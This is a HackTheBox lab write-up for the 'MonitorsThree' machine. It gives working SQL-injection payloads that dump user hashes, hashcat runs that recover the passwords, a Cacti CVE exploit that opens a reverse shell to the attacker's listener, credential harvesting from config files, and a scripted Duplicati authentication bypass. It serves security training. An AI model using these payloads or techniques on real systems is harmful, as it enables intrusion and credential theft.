@@ -1,0 +1,240 @@
+---
+title: "HTB: MonitorsThree"
+date: 2024-12-22
+description: "MonitorsThree is a Linux machine that consists of exploiting SQL Injection and Duplicati vulnerabilities."
+keywords: ["HTB", "HackTheBox", "MonitorsThree", "HTB MonitorsThree", "MonitorsThree.HTB"]
+draft: false
+---
+
+## Initial Foothold
+
+As always let's tart off by running nmap against our target to search for services and open ports.
+
+```bash
+kali@kali:~/HTB/MonitorsThree$ nmap -sV -sC -p- --min-rate=100000 -o nmap.result 10.129.231.115
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 03:13 EST
+Warning: 10.129.231.115 giving up on port because retransmission cap hit (10).
+Nmap scan report for monitorsthree.htb (10.129.231.115)
+Host is up (0.48s latency).
+Not shown: 47193 closed tcp ports (reset), 18340 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
+|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: MonitorsThree - Networking Solutions
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.96 seconds
+```
+
+Let's also run ffuf against the target to find potential subdomains.
+
+```bash
+kali@kali:~/HTB/MonitorsThree$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsthree.htb/ -H 'Host: FUZZ.monitorsthree.htb' -t 30 -fs 13560
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsthree.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.monitorsthree.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 30
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 13560
+________________________________________________
+
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 389ms]
+```
+
+Let's add `monitorsthree.htb` and `cacti.monitorsthree.htb` into our `/etc/hosts` file.
+
+```
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.129.106.81   monitorsthree.htb cacti.monitorsthree.htb
+```
+
+After investigating both of the domains for a while, I found an SQL Injection vulnerability inside the primary site. It's possible to extract information from the site by using the following payloads.
+
+```sql title="SQL Injection: To obtain database name"
+admin' and extractvalue(1,concat('~', database()))#
+```
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-1.png" className="rounded-lg" />
+
+```sql title="SQL Injection: To extract information from users table"
+admin' AND extractvalue(1, concat('~', (SELECT SUBSTRING(GROUP_CONCAT(username, ':', password), 1, 40) FROM users)))#
+```
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-2.png" className="rounded-lg" />
+
+```sql title="SQL Injection: To extract rest of the information from users table"
+admin' AND extractvalue(1, concat('~', (SELECT SUBSTRING(GROUP_CONCAT(username, ':', password), 30, 40) FROM users)))#
+```
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-3.png" className="rounded-lg" />
+
+After successfully obtaining the username and password hash of the administrator user. I decided to try to crack the password hash using hashcat. 
+
+```
+kali@kali:~/HTB/Machines/MonitorsThree$ hashcat -m 0 -a 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt 
+...
+31a181c8372e3afc59dab863430610e8:greencacti2001           
+...
+```
+
+Hashcat successfully managed to crack the password. We can now use `admin:greencacti2001` credentials to login to both of the web applications. However, the application running on subdomain is vulnerable for 
+[CVE-2024-25641](https://github.com/Safarchand/CVE-2024-25641) and after running it against the server, I successfully obtained a shell into server.
+
+```bash title="Kali Machine: Running CVE-2024-25641"
+(venv)kali@kali:~/HTB/Machines/MonitorsThree/CVE-2024-25641$ python3 ./exploit.py --url 'http://cacti.monitorsthree.htb' -u 'admin' -p 'greencacti2001' -i 10.10.16.26 -l 4444
+Cacti Instance Found!
+Login Successful!
+Package Import finalized
+Triggering shell..... make sure you've started the listener
+```
+
+```bash title="Kali Linux: Netcat Listener"
+kali@kali:~/HTB/Machines/MonitorsThree$ nc -lnvp 4444 
+listening on [any] 4444 ...
+connect to [10.10.16.26] from (UNKNOWN) [10.129.231.115] 57196
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname
+monitorsthree
+```
+
+Well well well... We successfully managed to obtain a shell into the machine as www-data user and to obtain the user flag we need to elevate our privileges to user.
+
+## Road To User
+
+After enumerating through the machine and multiple of files. I found out that there are MySQL credentials inside the `config.php` file which could potentially contain the hash of Marcus.
+
+```bash
+$ cat /var/html/cacti/include/config.php
+...
+$database_username = 'cactiuser';
+$database_password = 'cactiuser';
+...
+```
+
+You will need to start an interactive shell in order to access the MySQL service and luckily for us it's fairly easy using Python.
+
+```bash
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After starting an interactive shell, I decided to login to the MySQL service using the credentials found inside the `config.php` file and I succesfully managed to obtain the password hash of Marcus.
+
+```bash
+MariaDB [(none)]> USE cacti;
+MariaDB [cacti]> SELECT * FROM user_auth;
+
+...
+| 4 | marcus | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
+...
+```
+
+The password is encrypted using the blowfish algorithm and that can be cracked fairly quickly by Hashcat using the following command.
+
+```bash
+kali@kali:~/HTB/Machines/MonitorsThree$ hashcat -m 3200 -a 0 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt
+...
+$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
+...
+```
+
+We can now login as Marcus using the cracked password and read the user flag. Unfortunately, we cannot login through SSH as it requires us to add our public key to `authorized_keys` file.
+
+```bash
+www-data@monitorsthree:~/html/cacti/resource$ su marcus
+Password: 12345678910
+marcus@monitorsthree:/var/www/html/cacti/resource$ whoami
+marcus
+marcus@monitorsthree:/var/www/html/cacti/resource$ hostname
+monitorsthree
+marcus@monitorsthree:/var/www/html/cacti/resource$ cat /home/marcus/user.txt
+7def33d94e315ecd756b982eab4a65a2
+```
+
+## Road To Root
+
+To elevate the privileges on the machine you will need to do port forwarding on the web application running on port 8200 which is possible by using SSH and logging in as Marcus.
+
+```bash
+kali@kali:~/HTB/Machines/MonitorsThree$ ssh -i ~/.ssh/id_rsa marcus@monitorsthree.htb -L :8200:127.0.0.1:8200 
+```
+
+You should now be able to access the Duplicati web application which is primary used for backing up data. It's possible to bypass the authentication system for Duplicati by `server-passphrase` from the `Duplicati-server.sqlite` file.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-4.png" className="rounded-lg" />
+
+You will need to use Burp Suite and login to the application with any password and intercept the traffic to the `Nonce` field shows up in one of the login traffic.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-5.png" className="rounded-lg" />
+
+You will need to convert the `server-passphrase` from Base64 to Hex. Once that is completed than you will need to modify the `SALTEDPWD` and `NONCE` on the script below to your needs. This will generate the admin-istrator password for Duplicati.
+
+```javascript title="Password Hash Generator"
+var saltedpwd = 'SALTEDPWD';
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NONCE') + saltedpwd)).toString(CryptoJS.enc.Base64);
+console.log(noncedpwd)
+```
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-6.png" className="rounded-lg" />
+
+You can now continue forwarding the traffic on Burp Suite to the `password` field shows up and once the `password` field comes up replace it with the custom generated hash. You will need to url-encode the custom generated password hash.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-7.png" className="rounded-lg" />
+
+You can now stop intercepting the traffic using Burp Suite and you will be logged into the Duplicati web application without any issues. If you are still unable to login to the Duplicati web application using this method than I recommend reading through the following article [Bypass Duplicati Login Authentication Using DB Server-Passphrase](https://github.com/duplicati/duplicati/issues/5197).
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-8.png" className="rounded-lg" />
+
+To obtain access to the root folder we will need to create a backup of the `/source/root` folder and that will allow us to retrieve all the files inside the root folder.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-9.png" className="rounded-lg" />
+
+Once you have succesfully created the backup of root folder than you can click on restore button and that will allow you to restore any files inside the root folder.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-10.png" className="rounded-lg" />
+
+All that needs to be completed now is to assign the location which we want to restore the `root.txt` file and in my case I'll choose Marcus home folder.
+
+<img src="/assets/images/HTB-MonitorsThree/HTB-MonitorsThree-11.png" className="rounded-lg" />
+
+Once the restore task is completed you should now be able to see the `root.txt` file inside the location which you choose to store it. 
+
+```bash
+marcus@monitorsthree:~$ pwd
+/home/marcus
+marcus@monitorsthree:~$ whoami
+marcus
+marcus@monitorsthree:~$ hostname
+monitorsthree
+marcus@monitorsthree:~$ cat /home/marcus/root.txt
+[ROOT FLAG]
+```
+
+## Conclusion
+
+The MonitorsThree machine was a challenging machine which required me to use my Blind SQL Injection knowledge to obtain the initial foothold. It also required me to use Burp Suite to manually bypass the authentication of the Duplicati web application. I highly recommend doing the MonitorsThree machine if you're interested in increasing your understanding about Blind SQL Injection and Burp Suite. 
